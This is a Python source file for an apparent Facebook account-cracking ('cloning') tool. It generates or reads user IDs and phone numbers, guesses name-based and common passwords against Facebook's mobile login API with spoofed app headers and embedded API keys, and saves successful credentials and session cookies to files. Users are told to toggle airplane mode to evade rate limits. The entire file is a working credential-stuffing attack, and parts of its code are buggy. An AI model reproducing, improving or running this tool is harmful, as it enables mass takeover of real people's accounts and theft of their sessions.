import os
import zlib
from os import system as osRUB, system as cmd
import requests
import concurrent.futures
import mECH
from urllib.request import Request, urlopen
import re
import platform
import sys
import random
import subprocess
import threading
import itertools
import base64
import uuid
import json
import shutil
import webbrowser
import time
import datetime
import string
from concurrent.futures import ThreadPoolExecutor as RAJIB, ThreadPoolExecutor
from random import randint
from time import sleep as slp
from zlib import decompress

# Global variables
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total = []
methods = []
srange = 0
saved = []
filter = []
ok = []
cp = []
user = []
cok = []
plist = []

# Color definitions
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

# Headers for requests
head = {
    'Host': 'adsmanager.facebook.com',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'viewport-width': '980'
}

def clear():
    os.system('clear')
    print(logo)

def linex():
    print(f"{A}──────────────────────────────────────────────────")

logo = f"""
{G1}█████╗ {R}██╗  ██╗ {G1}█████╗ {R}███████╗{G1}██╗  ██╗
{G1}██╔══██╗{R}██║ ██╔╝{G1}██╔══██╗{R}██╔════╝{G1}██║  ██║
{G1}███████║{R}█████╔╝ {G1}███████║{R}███████╗{G1}███████║
{G1}██╔══██║{R}██╔═██╗ {G1}██╔══██║{R}╚════██║{G1}██╔══██║
{G1}██║  ██║{R}██║  ██╗{G1}██║  ██║{R}███████║{G1}██║  ██║
{G1}╚═╝  ╚═╝{R}╚═╝  ╚═╝{G1}╚═╝  ╚═╝{R}╚══════╝{G1}╚═╝  ╚═╝          

{A}═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═

{R}({G1}🇧🇩{R}) {G1}DEVELOPER  {R}➠  {G1}RAJIB-SORKAR
{R}({G1}🇧🇩{R}) {G1}GITHUB     {R}➠  {Y}MR-RAJIB-404
{R}({G1}🇧🇩{R}) {G1}TOOLS      {R}➠  {G1}FILE RANDAM 
{R}({G1}🇧🇩{R}) {G1}VERSION    {R}➠  {Y}0.1
{A}═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═
"""

def result(OKs, cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f"\r{A}──────────────────────────────────────────────────")
        print(f"{G1}[{A}={G1}] THE PROCESS HAS BEEN COMPLETE...")
        print(f"{G1}[{A}={G2}] TOTAL OK {A}:{G2} %s" % str(len(oks)))
        print(f"{G1}[{A}={G3}] TOTAL CP {A}:{G3} %s" % str(len(cps)))
        print(f"\r{A}──────────────────────────────────────────────────")
        input(f"{G1}[{A}?{G4}] PRESS ENTER TO BACK MENU ")
        exit()

def back():
    login()

def login():
    clear()
    os.system('espeak "YOUR REAL Name"')
    uname = input('\x1b[1;91m[\x1b[1;92m√\x1b[1;91m] \x1b[38;5;50mENTER YOUR NAME \x1b[1;91m: \x1b[1;32m')
    os.system('espeak "ENTER USERNAME"')
    
    attemps = 0
    while attemps < 12345677901:
        username = input('\x1b[1;91m[\x1b[1;33m√\x1b[1;91m]\x1b[38;5;50m \x1b[41mENTER USERNAME\x1b[40m: ')
        os.system('espeak "ENTER PASSWORD"')
        password = input('\x1b[1;95m[\x1b[1;33m√\x1b[1;95m]\x1b[38;5;50m\x1b[41m ENTER PASSWORD\x1b[40m: ')
        
        if username == 'RAJIB' and password == 'RAJIB':
            print(' \x1b[0;95mYou Have Successfully Logged in.')
            os.system('espeak -a 300 " Successfully, Log, In, Sir , mr , RAJIB"')
            break
        else:
            print(' Incorrect Pass Please Trying ')
            os.system('espeak "Incorrect Pass Please Trying"')
            attemps += 1
    
    os.system('clear')
    clear()
    
    from time import localtime as lt
    ltx = int(lt()[3])
    if ltx > 12:
        a = ltx - 12
        tag = 'PM'
    else:
        a = ltx
        tag = 'AM'

def menu():
    clear()
    print(f"{G1}[{A}1{G1}] FILE CLONING")
    print(f"{G1}[{A}2{G2}] RANDOM CLONING")
    print(f"{G1}[{A}3{G3}] CONTACT TOOL OWNER")
    print(f"{G1}[{A}0{G4}] EXIT TOOLS")
    linex()
    
    select = input(f"{G1}[{A}?{G5}] CHOICE {A}:{G5} ")
    
    if select == '1':
        _file_()
    elif select == '2':
        _randm_()
    elif select == '3':
        os.system('xdg-open https://www.facebook.com/MR.RAJIB.2003')
        menu()
    elif select == '0':
        exit(f"{G1}[{A}={G1}] EXIT DONE ")
    else:
        print(f"{G1}[{A}={G2}] VALID OPTION")
        time.sleep(2)
        menu()

def _randm_():
    clear()
    print(f"{G1}[{A}1{G1}] BANGLADESH CLONING")
    print(f"{G1}[{A}2{G2}] INDIA CLONING")
    print(f"{G1}[{A}0{G3}] BACK TO MAIN MENU")
    linex()
    
    select = input(f"{G1}[{A}?{G5}] CHOICE {A}:{G5} ")
    
    if select == '1':
        _bd_()
    elif select == '2':
        _India_()
    elif select == '0':
        menu()
    else:
        print(f"{G1}[{A}={G2}] VALID OPTION")
        time.sleep(2)
        _randm_()

def _bd_():
    clear()
    print(f"{G1}[{A}={G1}] EXAMPLE {A}:{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016")
    linex()
    
    code = input(f"{G1}[{A}?{G2}] CHOICE  {A}:{G2} ")
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    
    clear()
    print(f"{G1}[{A}={G3}] EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999")
    linex()
    
    limit = int(input(f"{G1}[{A}?{G4}] CHOICE  {A}:{G4} "))
    
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    
    clear()
    sexy = ThreadPoolExecutor(max_workers=30)
    clear()
    
    print(f"{G1}[{A}={G1}] SIM CODE  {A}:{G1} {code}")
    print(f"{G1}[{A}={G2}] TOTAL UID {A}:{G2} {str(len(user))}")
    print(f"{G1}[{A}={G3}] TURN [{A}ON{A}/{A}OFF{G3}] AIRPLANE MODE EVERY {A}3{G3} MIN")
    linex()
    
    for love in user:
        ids = code + name + cod + love
        psd = [code + name + cod + love, cod + love, name + love, code + name + cod, 'bangladesh', 'Bangladesh']
        sexy.submit(randm, ids, psd)
    
    print('')
    print(f"\r{A}──────────────────────────────────────────────────")
    print(f"{G1}[{A}={G1}] THE PROCESS HAS BEEN COMPLETED")
    print(f"{G1}[{A}={G2}] TOTAL OK ID {A}:{G2} {str(len(ok))}")
    print(f"{G1}[{A}={G3}] TOTAL CP ID {A}:{G3} {str(len(cp))}")
    print(f"\r{A}──────────────────────────────────────────────────")
    input(f"{G1}[{A}={G4}] PRESS ENTER TO BACK ")
    menu()

def _India_():
    clear()
    print(f"{G1}[{A}={G1}] EXAMPLE {A}:{G1} +91639{A}/+91934{A}/+91902{A}/+91701")
    linex()
    
    code = input(f"{G1}[{A}?{G2}] CHOICE  {A}:{G2} ")
    
    clear()
    print(f"{G1}[{A}={G3}] EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999")
    linex()
    
    limit = int(input(f"{G1}[{A}?{G4}] CHOICE  {A}:{G4} "))
    
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    
    clear()
    sexy = ThreadPoolExecutor(max_workers=30)
    clear()
    
    print(f"{G1}[{A}={G1}] SIM CODE  {A}:{G1} {code}")
    print(f"{G1}[{A}={G2}] TOTAL UID {A}:{G2} {str(len(user))}")
    print(f"{G1}[{A}={G3}] TURN [{A}ON{A}/{A}OFF{G3}] AIRPLANE MODE EVERY {A}3{G3} MIN")
    linex()
    
    for love in user:
        ids = code + love
        psd = [love, ids[:8], '57273200', '59039200', '57575751']
        sexy.submit(randm, ids, psd)
    
    print('')
    print(f"\r{A}──────────────────────────────────────────────────")
    print(f"{G1}[{A}={G1}] THE PROCESS HAS BEEN COMPLETED")
    print(f"{G1}[{A}={G2}] TOTAL OK ID {A}:{G2} {str(len(ok))}")
    print(f"{G1}[{A}={G3}] TOTAL CP ID {A}:{G3} {str(len(cp))}")
    print(f"\r{A}──────────────────────────────────────────────────")
    input(f"{G1}[{A}={G4}] PRESS ENTER TO BACK ")
    menu()

def _file_():
    clear()
    print(f"{G1}[{A}1{G1}] METHOD {G1}[{A}M1{G1}] ")
    print(f"{G1}[{A}2{G2}] METHOD {G2}[{A}M2{G2}] {G1}")
    linex()
    
    option = input(f"{G1}[{A}?{G3}] CHOICE {A}:{G3} ")
    
    if option == '1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option == '2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option == '0':
        _file_()
    else:
        print(f"{G1}[{A}={G2}] VALID OPTION")
        time.sleep(2)
        _file_()

class main_crack:
    def __init__(self):
        self.id = []
    
    def crack(self, id):
        clear()
        print(f"{G1}[{A}={G1}] EXAMPLE {A}:{G1} /sdcard/RAJIB .txt")
        linex()
        
        self.file = input(f"{G1}[{A}?{G2}] FILE NAME {A}:{G2} ")
        
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f"{G1}[{A}={G2}] OPPS FILE NOT FOUND ...")
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f"{G1}[{A}={G2}] TRY AGAIN ...")
            time.sleep(2)
            main_crack().crack(id)
    
    def methodA(self, sid, name, psw):
        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ";'[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281674;FBDM/{density=2.25,width=720,height=1332};FBLC/Grameenphone;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        
        sys.stdout.write('\r')
        sys.stdout.flush()
        
        fs = name.split(' ')[0]
        ls = name.split(' ')[1]
        
        for pw in psw:
            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
            
            with requests.Session() as session:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': sid,
                    'password': ps,
                    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                
                q = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
                
                if 'session_key' in q:
                    ckkk = ';'.join(i['name']+'='+i['value'] for i in q['session_cookies'])
                    swagb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f"sb={swagb};{ckkk}"
                    
                    print(f"\r\r{G1}[RAJIB -OK] {sid} | {ps} ")
                    open('/sdcard/RAJIB -M1-FILE-OK.txt', 'a').write(f"{sid}|{ps}|{cookie}\n")
                    oks.append(sid)
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[RAJIB -CP] {sid} | {ps} ")
                    open('/sdcard/RAJIB -M2-FILE-OK.txt', 'a').write(f"{sid}|{ps}\n")
                    cps.append(sid)
    
    def methodB(self, sid, name, psw):
        sys.stdout.write('\r')
        sys.stdout.flush()
        
        fs = name.split(' ')[0]
        ls = name.split(' ')[1]
        
        for pw in psw:
            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
            
            with requests.Session() as session:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': sid,
                    'password': ps,
                    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                
                headers = {
                    'User-Agent': '[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281674;FBDM/{density=2.25,width=720,height=1332};FBLC/Grameenphone;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                
                q = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
                
                if 'session_key' in q:
                    ckkk = ';'.join(i['name']+'='+i['value'] for i in q['session_cookies'])
                    swagb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f"sb={swagb};{ckkk}"
                    
                    print(f"\r\r{G1}[RAJIB -OK] {sid} | {ps} ")
                    open('/sdcard/RAJIB -M2-FILE-OK.txt', 'a').write(f"{sid}|{ps}|{cookie}\n")
                    oks.append(sid)
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[RAJIB -CP] {sid} | {ps} ")
                    open('/sdcard/RAJIB -M2-FILE-OK.txt', 'a').write(f"{sid}|{ps}\n")
                    cps.append(sid)
    
    def pasw(self):
        pw = []
        clear()
        print(f"{G1}[{A}={G1}] EXAMPLE {A}:{G1} BD 10-18/INDIA 3-5")
        linex()
        
        sl = int(input(f"{G1}[{A}?{G3}] PASSWORD LIMIT {A}:{G3} "))
        clear()
        
        print(f"{G1}[{A}?{G4}] EXAMPLE {A}:{G4} first123/firstlast/first@@@")
        linex()
        
        if sl == '':
            print(f"{G1}[{A}={G5}] PUT LIMIT BETWEEN 1 TO 30")
        elif sl > 20:
            print(f"{G1}[{A}={G1}] PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30")
        else:
            for sr in range(sl):
                pw.append(input(f"{G1}[{A}={G1}] PASSWORD NO {G1}[{A}{sr+1}{G1}] {A}:{G1} "))
        
        clear()
        print(f"{G1}[{A}={G1}] TOTAL FILE UID {A}:{G1} {len(self.id)} ")
        print(f"{G1}[{A}={G2}] PASSWORD LIMIT {A}:{G1} {sl} ")
        print(f"{G1}[{A}={G3}] TURN [{A}ON{A}/{A}OFF{G3}] AIRPLANE MODE EVERY {A}3{G3} MIN")
        linex()
        
        with ThreadPoolExecutor(max_workers=30) as swagworld:
            for zsb in self.id:
                uid, name = zsb.split('|')
                sz = name.split(' ')
                
                if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                    pwx = pw
                else:
                    pwx = pw
                
                if 'methodA' in methods:
                    swagworld.submit(self.methodA, uid, name, pwx)
                elif 'methodB' in methods:
                    swagworld.submit(self.methodB, uid, name, pwx)
        
        result(oks, cps)

def randm(sid, psw):
    sys.stdout.write('\r')
    sys.stdout.flush()
    
    fs = sid.split(' ')[0]
    ls = sid.split(' ')[1]
    
    for pw in psw:
        ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', sid).replace('name', sid.lower())
        
        with requests.Session() as session:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': sid,
                'password': ps,
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            
            headers = {
                'User-Agent': '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ";'[FBAN/FB4A;FBAV/263.0.0.46.121;FBBV/205281674;FBDM/{density=2.25,width=720,height=1332};FBLC/Grameenphone;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            
            try:
                q = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
                
                if 'session_key' in q:
                    ckkk = ';'.join(i['name']+'='+i['value'] for i in q['session_cookies'])
                    swagb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f"sb={swagb};{ckkk}"
                    
                    print(f"\r\r{G1}[RAJIB -OK] {sid} | {ps} ")
                    open('/sdcard/RAJIB -OK.txt', 'a').write(f"{sid}|{ps}|{cookie}\n")
                    ok.append(sid)
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[RAJIB -CP] {sid} | {ps} ")
                    open('/sdcard/RAJIB -CP.txt', 'a').write(f"{sid}|{ps}\n")
                    cp.append(sid)
            except requests.exceptions.ConnectionError:
                randm(sid, psw)
    
    loop += 1

menu()